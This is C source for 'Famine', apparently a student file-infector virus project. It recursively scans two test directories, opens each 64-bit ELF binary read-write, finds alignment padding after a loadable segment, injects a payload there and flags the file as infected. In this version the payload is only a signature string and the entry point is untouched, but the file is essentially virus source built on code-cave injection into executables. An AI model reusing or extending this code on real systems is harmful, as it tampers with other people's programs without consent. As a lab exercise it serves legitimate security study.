
#include <linux/limits.h>
#define _DEFAULT_SOURCE

#if __has_include(<elf.h>)
#  include <elf.h>
#elif __has_include(<sys/elf.h>)
#  include <sys/elf.h>
#else
#  error "Need ELF header."
#endif

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <dirent.h>
#include <errno.h>
#include <stddef.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define IS_NOT_ELF(ehdr) (                           \
    ((ehdr)->e_ident[EI_DATA] != ELFDATA2LSB         \
      && (ehdr)->e_ident[EI_DATA] != ELFDATA2MSB)    \
    || ehdr->e_ident[EI_VERSION] != EV_CURRENT       \
    || ehdr->e_ehsize != sizeof(Elf64_Ehdr)    \
    || ehdr->e_shentsize != sizeof(Elf64_Shdr) \
)

enum famineStatus {
    FAMINE_STATUS_OK = 0,
    ERR_CORRUPTED_FILE,
    ERR_EXTLIB_CALL,
    FAMINE_MAX_ERRORS
};

static const char *errors[FAMINE_MAX_ERRORS] = {
    [FAMINE_STATUS_OK]    = "",
    [ERR_CORRUPTED_FILE] = "Input file format is either not ELF or corrupted",
    [ERR_EXTLIB_CALL] = "An external library call failed during execution"
};

#define VERBOSITY 0

#define LOG_ERRNO() \
    if (VERBOSITY > 0) { \
        if (errno!=0) { \
            LOG_ERR("%s: %s", errors[ERR_EXTLIB_CALL], strerror(errno)); \
        } \
    }

#define TRY_RET(COMMAND) { \
    int __ret=(COMMAND); \
    if (unlikely(__ret!=FAMINE_STATUS_OK)) { \
        if (__ret==ERR_EXTLIB_CALL) { \
            LOG_ERRNO(); \
        } else { \
            LOG_ERR("%s", errors[__ret]); \
        } \
        return __ret; \
    } \
}

#define unlikely(x)     __builtin_expect(!!(x), 0)
#define LOG_ERR(FMT,...) \
    fprintf(stderr, "ERR|%s:%d|%s|" FMT "\n", __FILE__, __LINE__, __func__, ##__VA_ARGS__);

/* alignment MUST be a power of 2 */
#define ALIGN(addr, alignment) (((addr)+(alignment)-1)&~((alignment)-1))

static uint8_t payload[]= {
  0x46,0x61,0x6D,0x69,0x6E,0x65,0x20,0x76,0x65,0x72,0x73,0x69,
  0x6F,0x6E,0x20,0x31,0x2E,0x30,0x20,0x63,0x6F,0x64,0x65,0x64,
  0x20,0x62,0x79,0x20,0x74,0x6F,0x6D,0x61,0x72,0x74,0x69,0x6E,
  0x2D,0x26,0x63,0x61,0x72,0x63,0x65,0x2D,0x62,0x6F
};

// TODO:
// - implementar wrapper para syscalls ?


typedef struct FamineCtl_t {
    Elf64_Phdr *phtab; /* Primer elemento del array de program headers */
    Elf64_Ehdr *elf_hdr;
    Elf64_Phdr *phdr; /* PT_PHDR*/
    Elf64_Phdr *text_phdr; /* PT_LOAD con PF_X|PF_R */
    Elf64_Phdr *new_phdr; /* Nuevo PT_LOAD */
    uint8_t key[32];
    Elf64_Shdr *text_shdr;
    Elf64_Addr initial_entrypoint;
    Elf64_Xword text_len;
} FamineCtl_t;

__attribute__((unused)) static int _write(int fd, const void *buf, size_t len) {

    size_t total_written = 0;
    const char *p = (const char *)buf;

    while (total_written < len) {
        ssize_t bytes_written = write(fd, p + total_written, len - total_written);
        if (bytes_written == -1) {
            if (errno == EINTR) {
                continue;
            }
            return ERR_EXTLIB_CALL;
        }
        if (bytes_written == 0) {
            break;
        }
        total_written += bytes_written;
    }

    return FAMINE_STATUS_OK;
}

/* See https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.eheader.html#elfid */
static size_t get_ehdr_e_shnum(void* map, Elf64_Ehdr* ehdr) {
    if (ehdr->e_shnum >= SHN_LORESERVE) {
        return ((Elf64_Shdr *)(map + ehdr->e_shoff))->sh_size;
    }
    return ehdr->e_shnum;
}

/*
 * Calcula cuanto mide el fichero elf buscando cual es el offset + tamaño
 * más grande que hay. De esta forma el orden dentro del fichero nos da igual.
 * See https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.intro.html
 */
static int get_elf_size(void *map, Elf64_Ehdr *ehdr, size_t actual_size, size_t *computed_size) {

    size_t total = 0;
    Elf64_Off phoff = ehdr->e_phoff;
    Elf64_Off shoff = ehdr->e_shoff;
    Elf64_Half shentsize = ehdr->e_shentsize;
    Elf64_Half phentsize = ehdr->e_phentsize;
    size_t shnum = get_ehdr_e_shnum(map, ehdr);
    Elf64_Half phnum = ehdr->e_phnum;

    /* Most programs should be ok with this block */
    if (phoff < shoff) {
        total = shoff + shnum * shentsize;
    } else {
        total =  phoff + phnum * phentsize;
    }
    /* BUT this is not forbidden in the standard */
    for (size_t i = 0; i < phnum; i++) {
        if (phoff + i * phentsize > actual_size) {
            return ERR_CORRUPTED_FILE;
        }
        Elf64_Phdr *phent = map + phoff + i * phentsize;
        Elf64_Off p_offset = phent->p_offset;
        Elf64_Xword p_filesz = phent->p_filesz;
        if (p_offset + p_filesz > total) {
            total = p_offset + p_filesz;
        }
    }
    for (size_t i = 0; i < shnum; i++) {
        if (shoff + i * shentsize > actual_size) {
            return ERR_CORRUPTED_FILE;
        }
        Elf64_Shdr *shent = map + shoff + i * shentsize;
        Elf64_Off sh_offset = shent->sh_offset;
        Elf64_Xword sh_size = shent->sh_size;
        if (sh_offset + sh_size > total) {
            /* "A section of type SHT_NOBITS may have a non-zero size,
             * but it occupies no space in the file." */
            if (shent->sh_type != SHT_NOBITS ) {
                total = sh_offset + sh_size;
            }
        }
    }
    *computed_size = total;
    return FAMINE_STATUS_OK;
}

static void mark_file_as_patched(void *map) {
    ((Elf64_Ehdr *)(map))->e_ident[EI_NIDENT-1] = 1;
}

static int file_is_patched(void *map) {
    return ((Elf64_Ehdr *)(map))->e_ident[EI_NIDENT-1] == 1;
}


int patch_file(void *map, size_t size) {

    Elf64_Ehdr *ehdr = map;

    if (size < sizeof(Elf64_Ehdr)) {
        return ERR_CORRUPTED_FILE;
    }

    if (IS_NOT_ELF(ehdr)) {
        return ERR_CORRUPTED_FILE;
    }

    size_t computed_size = 0;
    TRY_RET(get_elf_size(map, ehdr, size, &computed_size));
    if (size != computed_size) {
        return ERR_CORRUPTED_FILE;
    }

    if (file_is_patched(map)) {
        return 0;
    }

    /* Loadable program segments cannot overlap or not be aligned. This means padding is added
     * to satisfy such conditions. We insert the text inside these "cavities". */
    Elf64_Phdr *injectable_phdr = NULL;
    Elf64_Phdr *phtab = map + ehdr->e_phoff;
    for (Elf64_Half i = 0; i < ehdr->e_phnum; i++) {
        Elf64_Phdr* phdr = &phtab[i];
        if (phdr->p_type == PT_LOAD) {
            size_t aligned_size = ALIGN(phdr->p_offset + phdr->p_filesz, phdr->p_align) - phdr->p_offset;
            size_t actual_size = phdr->p_filesz;
            if (aligned_size - actual_size > sizeof(payload)) {
                injectable_phdr = phdr;
                break;
            }
        }
    }

    if (!injectable_phdr) {
        // proceder añadiendo una nueva seccion y toda la pesca (llorar) -> O se lo dejo a Tomatin ! jaja
        return 0;
    }

    /* Print line into binary */
    uint8_t *offset = (uint8_t *)map + injectable_phdr->p_offset + injectable_phdr->p_filesz;
    if (offset > (uint8_t*)map + size) {
        // También nos vamos a la inyeccion de nueva seccion.
        return 0;
    }
    memcpy(offset, payload, sizeof(payload));
    mark_file_as_patched(map);
    return 0;
}

void process_file(char* filename) {

    int fd = -1;
    struct stat st;
    void* map = MAP_FAILED;
    int ret;

    if ((fd = open(filename, O_RDWR | O_NONBLOCK)) == -1) {
        LOG_ERRNO();
        goto cleanup;
    }
    if (fstat(fd, &st) == -1) {
        LOG_ERRNO();
        goto cleanup;
    }
    /* Read first 4 bytes of file to check if it is ELF */
    {
        char magic[SELFMAG];
        ssize_t n = read(fd, magic, SELFMAG);
        if (n != SELFMAG) {
            if (n == -1) {
                LOG_ERRNO();
            } else {
                LOG_ERR("%s", errors[ERR_CORRUPTED_FILE]);
            }
            goto cleanup;
        }
        if (strncmp(magic, ELFMAG, SELFMAG) != 0) {
            LOG_ERR("%s", errors[ERR_CORRUPTED_FILE]);
            goto cleanup;
        }
    }
    if ((map = mmap(NULL, st.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0)) == MAP_FAILED) {
        LOG_ERRNO();
        goto cleanup;
    }
    switch ((int)((unsigned char *)map)[EI_CLASS]) {
        case ELFCLASS64:
            if ((ret = patch_file(map, st.st_size))!= FAMINE_STATUS_OK) {
                LOG_ERR("%s", errors[ret]);
            }
            break;
        default:
            ;
    }

cleanup:

    if (map != MAP_FAILED && munmap(map, st.st_size) == -1) {
        LOG_ERRNO();
    }

    if (fd != -1 && close(fd) == -1) {
        LOG_ERRNO();
    }
}

/* Ídem de quitar stdlib haciendo que el entrypoint sea _start */

void traverse_directory(const char *path) {
    DIR *dir = opendir(path);
    if(!dir) { return; }
    
    struct dirent *entry;
    while((entry = readdir(dir)) != NULL) {
        
        if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) { continue; }
        
        char fullpath[PATH_MAX];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, entry->d_name);
        struct stat st;
        if(stat(fullpath, &st) == -1) { continue; }

        if(S_ISREG(st.st_mode)) {           //Archivo para procesar 
            process_file(fullpath); 
        } else if (S_ISDIR(st.st_mode)) {   //Directorio
            traverse_directory(fullpath);
        }
    }
    closedir(dir);
}

int main(void) {

    char *directories[] = {"/tmp/test", "tmp/test2", NULL};
    for (int i = 0; directories[i] != NULL; i++) {
        traverse_directory(directories[i]);
    }
    return 0;
}
